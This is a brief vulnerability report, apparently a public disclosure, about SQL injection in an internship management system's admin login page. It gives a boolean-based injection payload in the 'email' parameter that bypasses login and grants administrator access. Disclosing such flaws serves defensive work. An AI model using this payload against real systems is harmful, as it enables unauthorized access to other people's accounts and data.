BUG_Author:HaolunSong

Vulnerability File: /internship/admin/login.php

POST parameter 'email' exists SQL injection vulnerability

Payload1:email=-1' or 567=567#&password=2&login=

Boolean injection successful, can use any account to log in to the administrator account

![image](https://github.com/csbsong/bug_report/blob/main/sql1.png)
